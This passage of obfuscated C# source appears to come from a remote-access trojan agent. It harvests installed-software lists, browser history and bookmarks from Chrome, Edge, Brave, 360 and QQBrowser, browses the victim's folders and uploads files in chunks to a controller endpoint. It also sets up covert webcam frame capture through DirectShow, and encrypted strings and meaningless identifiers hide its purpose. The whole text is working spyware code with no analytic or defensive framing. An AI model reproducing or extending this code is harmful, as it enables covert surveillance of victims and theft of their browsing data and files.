                                            string version = (sub.GetValue("DisplayVersion") ?? "").ToString();
                                            string publisher = (sub.GetValue("Publisher") ?? "").ToString();
                                            string installDate = (sub.GetValue("InstallDate") ?? "").ToString();
                                            string uninstall = (sub.GetValue("UninstallString") ?? "").ToString();
                                            string installLoc = (sub.GetValue("InstallLocation") ?? "").ToString();

                                            if (!first) sb.Append(",");
                                            first = false;
                                            sb.Append(string.Format(
                                                "{{\"name\":\"{0}\",\"version\":\"{1}\",\"publisher\":\"{2}\",\"date\":\"{3}\",\"uninstall\":\"{4}\",\"location\":\"{5}\"}}",
                                                _AexenijxeK(name), _AexenijxeK(version),
                                                _AexenijxeK(publisher), _AexenijxeK(installDate),
                                                _AexenijxeK(uninstall), _AexenijxeK(installLoc)));
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                        catch { }
                    }

                    sb.Append("]}");
                    _TfnfMjSzCWKv("software_list_result", id, sb.ToString());
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("software_list_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        
        
        

        void _zxnrjVzIWaLKwPQAnfxf(string id)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var sb = new StringBuilder();
                    sb.Append("{");

                    
                    sb.Append("\"ieTypedUrls\":[");
                    bool first = true;
                    try
                    {
                        using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                            _Q._S("P5ZBs7yclWd/TthQA36nGQqNe46liYJwTWbFEzRppBoDi0K1l6meckZn5GE9Yg=="), false))
                        {
                            if (key != null)
                            {
                                foreach (string vn in key.GetValueNames())
                                {
                                    string url = (key.GetValue(vn) ?? "").ToString();
                                    if (string.IsNullOrEmpty(url)) continue;
                                    if (!first) sb.Append(",");
                                    first = false;
                                    sb.Append("{\"name\":\"" + _AexenijxeK(vn) + "\",\"url\":\"" + _AexenijxeK(url) + "\"}");
                                }
                            }
                        }
                    }
                    catch { }
                    sb.Append("],");

                    
                    sb.Append("\"favorites\":[");
                    first = true;
                    try
                    {
                        string favPath = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
                        if (Directory.Exists(favPath))
                        {
                            first = _NcdXBWHIRHTCSvrk(sb, favPath, "", first, 0);
                        }
                    }
                    catch { }
                    sb.Append("],");

                    
                    sb.Append("\"chromiumHistory\":[");
                    first = true;
                    try
                    {
                        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                        string[][] browsers = new string[][] {
                            new string[] { _Q._S("L5FVqKaY"), Path.Combine(localAppData, @"Google\Chrome\User Data") },
                            new string[] { _Q._S("KZ1Aog=="), Path.Combine(localAppData, @"Microsoft\Edge\User Data") },
                            new string[] { _Q._S("LotGsa4="), Path.Combine(localAppData, @"BraveSoftware\Brave-Browser\User Data") },
                            new string[] { "360SE", Path.Combine(localAppData, @"360Chrome\Chrome\User Data") },
                            new string[] { "QQBrowser", Path.Combine(localAppData, @"Tencent\QQBrowser\User Data") }
                        };

                        foreach (string[] b in browsers)
                        {
                            string bName = b[0];
                            string bPath = b[1];
                            if (!Directory.Exists(bPath)) continue;

                            string[] profiles = new string[] { "Default", "Profile 1", "Profile 2", "Profile 3" };
                            foreach (string prof in profiles)
                            {
                                string histFile = Path.Combine(bPath, prof, _Q._S("JJBUs6SPng=="));
                                if (!File.Exists(histFile)) continue;

                                try
                                {
                                    string tmp = Path.Combine(Path.GetTempPath(), "bh_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".db");
                                    CopyLockedFile(histFile, tmp);
                                    try { if (File.Exists(histFile + "-wal")) CopyLockedFile(histFile + "-wal", tmp + "-wal"); } catch { }
                                    try { if (File.Exists(histFile + "-shm")) CopyLockedFile(histFile + "-shm", tmp + "-shm"); } catch { }
                                    try
                                    {
                                        first = _eTWXEwKrBFfKePDQhp(tmp, bName, sb, first);
                                    }
                                    finally
                                    {
                                        try { File.Delete(tmp); } catch { }
                                        try { File.Delete(tmp + "-wal"); } catch { }
                                        try { File.Delete(tmp + "-shm"); } catch { }
                                    }
                                }
                                catch { }
                            }
                        }
                    }
                    catch { }
                    sb.Append("],");

                    
                    sb.Append("\"chromiumBookmarks\":[");
                    first = true;
                    try
                    {
                        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                        string[][] browsers = new string[][] {
                            new string[] { _Q._S("L5FVqKaY"), Path.Combine(localAppData, @"Google\Chrome\User Data\Default\Bookmarks") },
                            new string[] { _Q._S("KZ1Aog=="), Path.Combine(localAppData, @"Microsoft\Edge\User Data\Default\Bookmarks") }
                        };
                        foreach (string[] b in browsers)
                        {
                            if (!File.Exists(b[1])) continue;
                            try
                            {
                                string json = File.ReadAllText(b[1], Encoding.UTF8);
                                first = _IRVuUzXgfAuNmSbbuwm(sb, json, b[0], first);
                            }
                            catch { }
                        }
                    }
                    catch { }
                    sb.Append("]");

                    sb.Append("}");
                    _TfnfMjSzCWKv("browser_history_result", id, sb.ToString());
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("browser_history_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        bool _NcdXBWHIRHTCSvrk(StringBuilder sb, string dir, string prefix, bool first, int depth)
        {
            if (depth > 5) return first;
            try
            {
                foreach (string file in Directory.GetFiles(dir, "*.url"))
                {
                    try
                    {
                        string url = "";
                        foreach (string line in File.ReadAllLines(file))
                        {
                            if (line.StartsWith("URL=", StringComparison.OrdinalIgnoreCase))
                            {
                                url = line.Substring(4).Trim();
                                break;
                            }
                        }
                        if (string.IsNullOrEmpty(url)) continue;
                        string name = Path.GetFileNameWithoutExtension(file);
                        if (!first) sb.Append(",");
                        first = false;
                        sb.Append("{\"folder\":\"" + _AexenijxeK(prefix) +
                            "\",\"name\":\"" + _AexenijxeK(name) +
                            "\",\"url\":\"" + _AexenijxeK(url) + "\"}");
                    }
                    catch { }
                }
                foreach (string sub in Directory.GetDirectories(dir))
                {
                    string subName = Path.GetFileName(sub);
                    string newPrefix = string.IsNullOrEmpty(prefix) ? subName : prefix + "/" + subName;
                    first = _NcdXBWHIRHTCSvrk(sb, sub, newPrefix, first, depth + 1);
                }
            }
            catch { }
            return first;
        }

        
        bool _eTWXEwKrBFfKePDQhp(string dbPath, string browser, StringBuilder sb, bool first)
        {
            IntPtr db = IntPtr.Zero, stmt = IntPtr.Zero;
            try
            {
                byte[] pathUtf8 = Encoding.UTF8.GetBytes(dbPath + "\0");
                if (sqlite3_open_v2(pathUtf8, out db, SQLITE_OPEN_READONLY, IntPtr.Zero) != SQLITE_OK)
                    return first;

                byte[] sql = Encoding.UTF8.GetBytes(
                    "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 200\0");
                if (sqlite3_prepare_v2(db, sql, -1, out stmt, IntPtr.Zero) != SQLITE_OK)
                    return first;

                int count = 0;
                while (sqlite3_step(stmt) == SQLITE_ROW && count < 200)
                {
                    string url = SqliteColStr(stmt, 0);
                    string title = SqliteColStr(stmt, 1) ?? "";
                    string visits = SqliteColStr(stmt, 2) ?? "0";
                    if (string.IsNullOrEmpty(url) || !url.StartsWith("http")) continue;

                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append(string.Format(
                        "{{\"browser\":\"{0}\",\"url\":\"{1}\",\"title\":\"{2}\",\"visits\":{3}}}",
                        _AexenijxeK(browser), _AexenijxeK(url), _AexenijxeK(title), visits));
                    count++;
                }
            }
            catch { }
            finally
            {
                if (stmt != IntPtr.Zero) sqlite3_finalize(stmt);
                if (db != IntPtr.Zero) sqlite3_close(db);
            }
            return first;
        }

        
        List<string> _fYOSNbroFYBPTairuoyF(string dbPath, string browser)
        {
            var results = new List<string>();
            try
            {
                byte[] data = File.ReadAllBytes(dbPath);
                if (data.Length < 100 || Encoding.ASCII.GetString(data, 0, 15) != _Q._S("P6hrrr+Yx2RMcdxSBTHn"))
                    return results;

                int pageSize = (data[16] << 8) | data[17];
                if (pageSize == 1) pageSize = 65536;
                if (pageSize < 512) return results;

                int totalPages = data.Length / pageSize;
                var seen = new HashSet<string>();

                for (int pg = 0; pg < totalPages; pg++)
                {
                    int off = pg * pageSize;
                    int hdr = off + (pg == 0 ? 100 : 0);
                    if (hdr >= data.Length) continue;
                    if (data[hdr] != 0x0D) continue; 

                    int cellCount = (data[hdr + 3] << 8) | data[hdr + 4];
                    int ptrStart = hdr + 8;

                    for (int c = 0; c < cellCount && c < 500; c++)
                    {
                        int ptrOff = ptrStart + c * 2;
                        if (ptrOff + 2 > data.Length) break;
                        int cellOff = off + ((data[ptrOff] << 8) | data[ptrOff + 1]);
                        if (cellOff >= data.Length) continue;

                        try
                        {
                            int p = cellOff;
                            int n;
                            long payloadLen;
                            ReadVarint(data, p, out payloadLen, out n); p += n;
                            long rowid;
                            ReadVarint(data, p, out rowid, out n); p += n;

                            long recHdrSize;
                            int hb;
                            ReadVarint(data, p, out recHdrSize, out hb);
                            int recHdrEnd = p + (int)recHdrSize;
                            int hp = p + hb;

                            var colTypes = new List<long>();
                            while (hp < recHdrEnd && hp < data.Length)
                            {
                                long st;
                                ReadVarint(data, hp, out st, out n);
                                hp += n;
                                colTypes.Add(st);
                            }

                            
                            if (colTypes.Count < 4) continue;

                            int dp = recHdrEnd;
                            string url = null;
                            string title = null;
                            long visitCount = 0;

                            for (int col = 0; col < colTypes.Count && dp < data.Length; col++)
                            {
                                long st = colTypes[col];
                                int colLen = SqliteColSize(st);
                                if (dp + colLen > data.Length) break;

                                
                                if (col == 1 && st >= 13 && st % 2 == 1)
                                {
                                    int tl = (int)(st - 13) / 2;
                                    if (tl > 0 && dp + tl <= data.Length)
                                        url = Encoding.UTF8.GetString(data, dp, tl);
                                }
                                else if (col == 2 && st >= 13 && st % 2 == 1)
                                {
                                    int tl = (int)(st - 13) / 2;
                                    if (tl > 0 && dp + tl <= data.Length)
                                        title = Encoding.UTF8.GetString(data, dp, tl);
                                }
                                else if (col == 3)
                                {
                                    visitCount = ReadSqliteInt(data, dp, colLen);
                                }

                                dp += colLen;
                            }

                            if (!string.IsNullOrEmpty(url) && url.StartsWith("http") && !seen.Contains(url))
                            {
                                seen.Add(url);
                                if (results.Count >= 200) break;
                                results.Add(string.Format(
                                    "{{\"browser\":\"{0}\",\"url\":\"{1}\",\"title\":\"{2}\",\"visits\":{3}}}",
                                    _AexenijxeK(browser), _AexenijxeK(url),
                                    _AexenijxeK(title ?? ""), visitCount));
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            return results;
        }

        
        bool _IRVuUzXgfAuNmSbbuwm(StringBuilder sb, string json, string browser, bool first)
        {
            int idx = 0;
            int count = 0;
            while (idx < json.Length && count < 200)
            {
                int urlKey = json.IndexOf("\"url\"", idx);
                if (urlKey < 0) break;
                int colon = json.IndexOf(':', urlKey + 5);
                if (colon < 0) break;
                int qStart = json.IndexOf('"', colon + 1);
                if (qStart < 0) break;
                int qEnd = json.IndexOf('"', qStart + 1);
                if (qEnd < 0) break;
                string url = json.Substring(qStart + 1, qEnd - qStart - 1);

                
                string name = "";
                int nameKey = json.LastIndexOf("\"name\"", urlKey);
                if (nameKey >= 0 && urlKey - nameKey < 300)
                {
                    int nc = json.IndexOf(':', nameKey + 6);
                    if (nc >= 0)
                    {
                        int nqs = json.IndexOf('"', nc + 1);
                        if (nqs >= 0)
                        {
                            int nqe = json.IndexOf('"', nqs + 1);
                            if (nqe >= 0)
                                name = json.Substring(nqs + 1, nqe - nqs - 1);
                        }
                    }
                }

                if (url.StartsWith("http"))
                {
                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append("{\"browser\":\"" + _AexenijxeK(browser) +
                        "\",\"name\":\"" + _AexenijxeK(name) +
                        "\",\"url\":\"" + _AexenijxeK(url) + "\"}");
                    count++;
                }

                idx = qEnd + 1;
            }
            return first;
        }

        
        static void ReadVarint(byte[] data, int pos, out long val, out int n)
        {
            val = 0; n = 0;
            for (int i = 0; i < 9 && pos + i < data.Length; i++)
            {
                val = (val << 7) | (long)(data[pos + i] & 0x7F);
                n = i + 1;
                if ((data[pos + i] & 0x80) == 0) return;
            }
        }

        static int SqliteColSize(long st)
        {
            if (st == 0 || st == 8 || st == 9) return 0;
            if (st == 1) return 1;
            if (st == 2) return 2;
            if (st == 3) return 3;
            if (st == 4) return 4;
            if (st == 5) return 6;
            if (st == 6 || st == 7) return 8;
            if (st >= 12 && st % 2 == 0) return (int)(st - 12) / 2;
            if (st >= 13 && st % 2 == 1) return (int)(st - 13) / 2;
            return 0;
        }

        static long ReadSqliteInt(byte[] data, int off, int len)
        {
            long v = 0;
            for (int i = 0; i < len && off + i < data.Length; i++)
                v = (v << 8) | data[off + i];
            return v;
        }

        
        
        

        void _KsKKqtNqALTpGLhi(string id, string payload)
        {
            try
            {
                string path = _hUALleDbnckSq(payload, "path");
                if (string.IsNullOrEmpty(path))
                    path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                if (!Directory.Exists(path))
                {
                    _TfnfMjSzCWKv("file_browse_result", id, "{\"error\":\"目录不存在: " + _AexenijxeK(path) + "\"}");
                    return;
                }

                var sb = new StringBuilder();
                sb.Append("{\"path\":\"" + _AexenijxeK(Path.GetFullPath(path)) + "\",\"items\":[");
                bool first = true;

                
                try
                {
                    foreach (string dir in Directory.GetDirectories(path))
                    {
                        try
                        {
                            string name = Path.GetFileName(dir);
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append("{\"name\":\"" + _AexenijxeK(name) + "\",\"type\":\"dir\",\"size\":0,\"modified\":\"\"}");
                        }
                        catch { }
                    }
                }
                catch { }

                
                try
                {
                    foreach (string file in Directory.GetFiles(path))
                    {
                        try
                        {
                            var fi = new FileInfo(file);
                            string name = fi.Name;
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format("{{\"name\":\"{0}\",\"type\":\"file\",\"size\":{1},\"modified\":\"{2}\"}}",
                                _AexenijxeK(name), fi.Length, fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")));
                        }
                        catch { }
                    }
                }
                catch { }

                sb.Append("]}");
                _TfnfMjSzCWKv("file_browse_result", id, sb.ToString());
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("file_browse_result", id, "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        void _XOiZnRPnBBupTuArVL(string id, string payload)
        {
            try
            {
                string filePath = _hUALleDbnckSq(payload, "path");
                if (string.IsNullOrEmpty(filePath))
                {
                    _TfnfMjSzCWKv("file_download_result", id, "{\"error\":\"路径不能为空\"}");
                    return;
                }

                if (!File.Exists(filePath))
                {
                    _TfnfMjSzCWKv("file_download_result", id, "{\"error\":\"文件不存在\"}");
                    return;
                }

                var fi = new FileInfo(filePath);
                string name = fi.Name;
                long size = fi.Length;

                
                if (size > 500L * 1024 * 1024)
                {
                    _TfnfMjSzCWKv("file_download_result", id,
                        "{\"error\":\"文件过大 (" + (size / 1024 / 1024) + "MB)，最大 500MB\"}");
                    return;
                }

                
                if (size <= 5 * 1024 * 1024)
                {
                    byte[] data = File.ReadAllBytes(filePath);
                    string b64 = Convert.ToBase64String(data);
                    _TfnfMjSzCWKv("file_download_result", id, string.Format(
                        "{{\"name\":\"{0}\",\"size\":{1},\"data\":\"{2}\"}}",
                        _AexenijxeK(name), data.Length, b64));
                    return;
                }

                
                string downloadId = Guid.NewGuid().ToString("N");
                int chunkSize = 1 * 1024 * 1024; 
                int totalChunks = (int)((size + chunkSize - 1) / chunkSize);
                string chunkUrl = _hXDJfNdoAJ.TrimEnd('/') + "/api/agent/file-chunk";

                using (var fs = File.OpenRead(filePath))
                {
                    byte[] buf = new byte[chunkSize];
                    for (int i = 0; i < totalChunks; i++)
                    {
                        int read = fs.Read(buf, 0, chunkSize);
                        byte[] chunk = read == chunkSize ? buf : new byte[read];
                        if (read != chunkSize) Array.Copy(buf, chunk, read);

                        using (var wc = new WebClient())
                        {
                            wc.Headers["X-Download-ID"] = downloadId;
                            wc.Headers["X-Chunk-Index"] = i.ToString();
                            wc.Headers["X-Total-Chunks"] = totalChunks.ToString();
                            wc.Headers["X-File-Name"] = Uri.EscapeDataString(name);
                            wc.Headers["Content-Type"] = "application/octet-stream";
                            wc.UploadData(chunkUrl, "POST", chunk);
                        }
                    }
                }

                
                _TfnfMjSzCWKv("file_download_result", id, string.Format(
                    "{{\"name\":\"{0}\",\"size\":{1},\"downloadId\":\"{2}\",\"chunks\":{3}}}",
                    _AexenijxeK(name), size, downloadId, totalChunks));
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("file_download_result", id, "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        
        
        

        [DllImport("ole32.dll")]
        static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
        [DllImport("ole32.dll")]
        static extern void CoUninitialize();

        [DllImport("ole32.dll")]
        static extern void CoTaskMemFree(IntPtr pv);
        [DllImport("ole32.dll")]
        static extern int CoCreateInstance(ref Guid rclsid, IntPtr pOuter, uint ctx, ref Guid riid, out IntPtr ppv);

        
        static T _hDDCzP<T>(IntPtr obj, int slot) where T : class
        {
            IntPtr fn = Marshal.ReadIntPtr(Marshal.ReadIntPtr(obj), slot * IntPtr.Size);
            return (T)(object)Marshal.GetDelegateForFunctionPointer(fn, typeof(T));
        }
        static void _czyoKJ(ref IntPtr p)
        {
            if (p != IntPtr.Zero)
            {
                _hDDCzP<DsRelDlg>(p, 2)(p);
                p = IntPtr.Zero;
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsRelDlg(IntPtr self);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsQIDlg(IntPtr self, ref Guid iid, out IntPtr ppv);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsCreateClassEnumDlg(IntPtr self, ref Guid cls, out IntPtr ppEnum, int flags);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsEnumNextDlg(IntPtr self, int celt, out IntPtr rgelt, out int fetched);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsBindToObjDlg(IntPtr self, IntPtr pbc, IntPtr pmk, ref Guid iid, out IntPtr ppv);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsAddFilterDlg(IntPtr self, IntPtr pFilter, [MarshalAs(UnmanagedType.LPWStr)] string name);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsSetFgDlg(IntPtr self, IntPtr pfg);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsFindInterfaceDlg(IntPtr self, ref Guid pCat, ref Guid pType, IntPtr pSrc, ref Guid iid, out IntPtr ppv);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsRenderStreamDlg(IntPtr self, ref Guid pCat, ref Guid pType, IntPtr pSrc, IntPtr pComp, IntPtr pRend);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsScGetFmtDlg(IntPtr self, out IntPtr ppmt);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsScSetFmtDlg(IntPtr self, IntPtr pmt);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsSgSetOneShotDlg(IntPtr self, int os);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsSgSetMtDlg(IntPtr self, IntPtr pType);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsSgGetMtDlg(IntPtr self, IntPtr pType);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsSgSetBufDlg(IntPtr self, int buf);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsSgGetBufDlg(IntPtr self, ref int size, IntPtr buf);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsMcRunDlg(IntPtr self);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DsMcStopDlg(IntPtr self);

        
        [StructLayout(LayoutKind.Sequential)]
        struct DsMediaType
        {
            public Guid majortype;   
            public Guid subtype;     
            public int bFixed;       
            public int bTemporal;    
            public int sampleSize;   
            public Guid formattype;  
            public IntPtr pUnk;      
            public int cbFormat;
            public IntPtr pbFormat;
        }

        static readonly Guid DS_SysDevEnum = new Guid("62BE5D10-60EB-11d0-BD3B-00A0C911CE86");
        static readonly Guid DS_VidInputCat = new Guid("860BB310-5D01-11d0-BD3B-00A0C911CE86");
        static readonly Guid DS_FilterGraph = new Guid("E436EBB3-524F-11CE-9F53-0020AF0BA770");
        static readonly Guid DS_CapGraphBld2 = new Guid("BF87B6E1-8C27-11d0-B3F0-00AA003761C5");
        static readonly Guid DS_SampleGrab = new Guid("C1F400A0-3F08-11D3-9F0B-006008039E37");
        static readonly Guid DS_NullRend = new Guid("C1F400A4-3F08-11D3-9F0B-006008039E37");
        static readonly Guid IID_ICreateDevEnum = new Guid("29840822-5B84-11D0-BD3B-00A0C911CE86");
        static readonly Guid IID_IGraphBuilder = new Guid("56a868a9-0ad4-11ce-b03a-0020af0ba770");
        static readonly Guid IID_ICapGraphBld2 = new Guid("93E5A4E0-2D50-11d2-ABFA-00A0C9C6E38D");
        static readonly Guid IID_ISampleGrab = new Guid("6B652FFF-11FE-4fce-92AD-0266B5D7C78F");
        static readonly Guid IID_IBaseFilter = new Guid("56a86895-0ad4-11ce-b03a-0020af0ba770");
        static readonly Guid IID_IMediaCtrl = new Guid("56a868b1-0ad4-11ce-b03a-0020af0ba770");
        static Guid DS_MediaTypeVideo = new Guid("73646976-0000-0010-8000-00AA00389B71");
        static Guid DS_RGB24 = new Guid("e436eb7d-524f-11ce-9f53-0020af0ba770");
        static Guid DS_PinCapture = new Guid("fb6c4281-0353-11d1-905f-0000c0cc16ba");
        static Guid DS_PinPreview = new Guid("fb6c4282-0353-11d1-905f-0000c0cc16ba");
        static readonly Guid DS_FormatVideoInfo = new Guid("05589f80-c356-11ce-bf01-00aa0055595a");

        
        
        bool _MQwLNAokWPM(out IntPtr pGraph, out IntPtr pGrabber, out IntPtr pMC,
                         out int w, out int h, out string error,
                         out IntPtr pCapBld, out IntPtr pCapFilter, out IntPtr pGrabFilter, out IntPtr pNullRend)
        {
            pGraph = pGrabber = pMC = pCapBld = pCapFilter = pGrabFilter = pNullRend = IntPtr.Zero;
            w = 320; h = 240; error = null;
            IntPtr pDevEnum = IntPtr.Zero, pEnumMon = IntPtr.Zero, pMoniker = IntPtr.Zero;
            int hr;

            try
            {
                
                var clsSDE = DS_SysDevEnum; var iidDE = IID_ICreateDevEnum;
                hr = CoCreateInstance(ref clsSDE, IntPtr.Zero, 1, ref iidDE, out pDevEnum);
                if (hr < 0) { error = "CreateDevEnum失败(0x" + hr.ToString("X8") + ")"; return false; }

                var catVid = DS_VidInputCat;
                hr = _hDDCzP<DsCreateClassEnumDlg>(pDevEnum, 3)(pDevEnum, ref catVid, out pEnumMon, 0);
                if (hr < 0 || pEnumMon == IntPtr.Zero) { error = "无视频设备类(0x" + hr.ToString("X8") + ")"; return false; }

                int fetched;
                hr = _hDDCzP<DsEnumNextDlg>(pEnumMon, 3)(pEnumMon, 1, out pMoniker, out fetched);
                if (hr != 0 || pMoniker == IntPtr.Zero) { error = "未检测到摄像头"; return false; }

                
                var iidBF = IID_IBaseFilter;
                hr = _hDDCzP<DsBindToObjDlg>(pMoniker, 8)(pMoniker, IntPtr.Zero, IntPtr.Zero, ref iidBF, out pCapFilter);
                if (hr < 0) { error = "绑定设备失败(0x" + hr.ToString("X8") + ")"; return false; }

                
                var clsFG = DS_FilterGraph; var iidGB = IID_IGraphBuilder;
                hr = CoCreateInstance(ref clsFG, IntPtr.Zero, 1, ref iidGB, out pGraph);
                if (hr < 0) { error = "创建FilterGraph失败"; return false; }

                
                var clsCGB = DS_CapGraphBld2; var iidCGB = IID_ICapGraphBld2;
                hr = CoCreateInstance(ref clsCGB, IntPtr.Zero, 1, ref iidCGB, out pCapBld);
                if (hr < 0) { error = "创建CaptureGraphBuilder失败"; return false; }
                _hDDCzP<DsSetFgDlg>(pCapBld, 3)(pCapBld, pGraph);

                
                _hDDCzP<DsAddFilterDlg>(pGraph, 3)(pGraph, pCapFilter, "Capture");

                
                var clsSG = DS_SampleGrab; var iidSG = IID_ISampleGrab;
                hr = CoCreateInstance(ref clsSG, IntPtr.Zero, 1, ref iidSG, out pGrabber);
                if (hr < 0) { error = "创建SampleGrabber失败(0x" + hr.ToString("X8") + ")"; return false; }

                
                int mtSize = Marshal.SizeOf(typeof(DsMediaType));
                IntPtr pMT = Marshal.AllocCoTaskMem(mtSize);
                for (int i = 0; i < mtSize; i++) Marshal.WriteByte(pMT, i, 0);
                Marshal.StructureToPtr(new DsMediaType { majortype = DS_MediaTypeVideo, subtype = DS_RGB24 }, pMT, false);
                _hDDCzP<DsSgSetMtDlg>(pGrabber, 4)(pGrabber, pMT);
                Marshal.FreeCoTaskMem(pMT);

                
                _hDDCzP<DsQIDlg>(pGrabber, 0)(pGrabber, ref iidBF, out pGrabFilter);
                _hDDCzP<DsAddFilterDlg>(pGraph, 3)(pGraph, pGrabFilter, "Grabber");

                
                var clsNR = DS_NullRend;
                hr = CoCreateInstance(ref clsNR, IntPtr.Zero, 1, ref iidBF, out pNullRend);
                if (hr < 0) { error = "创建NullRenderer失败"; return false; }
                _hDDCzP<DsAddFilterDlg>(pGraph, 3)(pGraph, pNullRend, "Null");

                
                hr = _hDDCzP<DsRenderStreamDlg>(pCapBld, 7)(pCapBld, ref DS_PinPreview, ref DS_MediaTypeVideo, pCapFilter, pGrabFilter, pNullRend);
                if (hr < 0)
                    hr = _hDDCzP<DsRenderStreamDlg>(pCapBld, 7)(pCapBld, ref DS_PinCapture, ref DS_MediaTypeVideo, pCapFilter, pGrabFilter, pNullRend);
                if (hr < 0) { error = "RenderStream失败(0x" + hr.ToString("X8") + ")"; return false; }

                
                _hDDCzP<DsSgSetBufDlg>(pGrabber, 6)(pGrabber, 1); 

                
                IntPtr pConnMT = Marshal.AllocCoTaskMem(mtSize + 64);
                for (int i = 0; i < mtSize + 64; i++) Marshal.WriteByte(pConnMT, i, 0);
                if (_hDDCzP<DsSgGetMtDlg>(pGrabber, 5)(pGrabber, pConnMT) >= 0)
                {
                    DsMediaType cmt = (DsMediaType)Marshal.PtrToStructure(pConnMT, typeof(DsMediaType));
                    if (cmt.pbFormat != IntPtr.Zero && cmt.cbFormat >= 48 + 12)
                    {
                        
                        
                        w = Marshal.ReadInt32(cmt.pbFormat, 52);
                        h = Math.Abs(Marshal.ReadInt32(cmt.pbFormat, 56));
                    }
                    if (cmt.pbFormat != IntPtr.Zero) CoTaskMemFree(cmt.pbFormat);
                    if (cmt.pUnk != IntPtr.Zero) _hDDCzP<DsRelDlg>(cmt.pUnk, 2)(cmt.pUnk);
                }
                Marshal.FreeCoTaskMem(pConnMT);
                if (w <= 0) w = 320;
                if (h <= 0) h = 240;

                
                var iidMC = IID_IMediaCtrl;
                _hDDCzP<DsQIDlg>(pGraph, 0)(pGraph, ref iidMC, out pMC);
                return true;
            }
            catch (Exception ex)
            {
                error = ex.Message;
                return false;
            }
            finally
            {
                _czyoKJ(ref pMoniker);
                _czyoKJ(ref pEnumMon);
                _czyoKJ(ref pDevEnum);
            }
        }

        void _dkAMirlaDXLfrh(ref IntPtr pMC, ref IntPtr pGraph, ref IntPtr pGrabber,
                            ref IntPtr pCapBld, ref IntPtr pCapFilter, ref IntPtr pGrabFilter, ref IntPtr pNullRend)
        {
            if (pMC != IntPtr.Zero) { try { _hDDCzP<DsMcStopDlg>(pMC, 9)(pMC); } catch { } }
            _czyoKJ(ref pNullRend);
            _czyoKJ(ref pGrabFilter);
            _czyoKJ(ref pCapFilter);
            _czyoKJ(ref pGrabber);
            _czyoKJ(ref pCapBld);
            _czyoKJ(ref pMC);
            _czyoKJ(ref pGraph);
        }

        byte[] _qFuUSEGjuo(IntPtr pGrabber, int w, int h, int quality,
                          ImageCodecInfo jpgEnc, EncoderParameters ep)
        {
            int bufSize = 0;
            int hr = _hDDCzP<DsSgGetBufDlg>(pGrabber, 7)(pGrabber, ref bufSize, IntPtr.Zero);
            if (hr < 0 || bufSize <= 0) return null;

            byte[] pixels = new byte[bufSize];
            GCHandle hPin = GCHandle.Alloc(pixels, GCHandleType.Pinned);
            try { _hDDCzP<DsSgGetBufDlg>(pGrabber, 7)(pGrabber, ref bufSize, hPin.AddrOfPinnedObject()); }
            finally { hPin.Free(); }

            int bpp = bufSize / (w * h);
            if (bpp < 3) bpp = 3;
            if (bpp > 4) bpp = 3;
            var pixFmt = bpp == 3 ? System.Drawing.Imaging.PixelFormat.Format24bppRgb
                                  : System.Drawing.Imaging.PixelFormat.Format32bppRgb;
            int stride = w * bpp;

            using (var bmp = new Bitmap(w, h, pixFmt))
            {
                var bd = bmp.LockBits(new Rectangle(0, 0, w, h),
                    System.Drawing.Imaging.ImageLockMode.WriteOnly, pixFmt);
                for (int y = 0; y < h; y++)
                {
                    int srcOff = (h - 1 - y) * stride;
                    if (srcOff + stride > pixels.Length) srcOff = y * stride;
                    Marshal.Copy(pixels, srcOff,
                        new IntPtr(bd.Scan0.ToInt64() + y * bd.Stride), Math.Min(stride, bd.Stride));
                }
                bmp.UnlockBits(bd);

                using (var ms = new MemoryStream())
                {
                    if (jpgEnc != null) bmp.Save(ms, jpgEnc, ep);
                    else bmp.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
        }

        void _mWkDaLEWeYPWJRph(string id, string payload)
        {
            IntPtr pGraph = IntPtr.Zero, pGrabber = IntPtr.Zero, pMC = IntPtr.Zero;
